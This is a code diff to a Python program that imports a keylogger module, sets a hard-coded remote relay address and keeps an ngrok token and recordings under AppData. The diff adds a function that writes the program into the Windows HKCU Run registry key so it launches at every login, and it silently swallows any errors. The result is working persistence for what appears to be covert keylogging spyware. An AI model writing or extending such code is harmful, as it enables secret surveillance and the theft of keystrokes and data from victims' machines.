@@ -1,4 +1,5 @@
 import os
+import sys
 import threading
 
 import keylogger as kl
@@ -16,6 +17,22 @@ NORA_RELAY = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
 _APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
 _TOKEN_FILE     = os.path.join(_APP_DIR, "ngrok.token")
 _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
+
+
+def _register_startup():
+    """Add this EXE to HKCU Run key so it starts automatically on login."""
+    try:
+        import winreg
+        exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE,
+        )
+        winreg.SetValueEx(key, "NoraMonitor", 0, winreg.REG_SZ, f'"{exe}"')
+        winreg.CloseKey(key)
+    except Exception:
+        pass
 
 
 def _load_token():
@@ -95,4 +112,5 @@ def main():
 
 
 if __name__ == "__main__":
+    _register_startup()
     main()
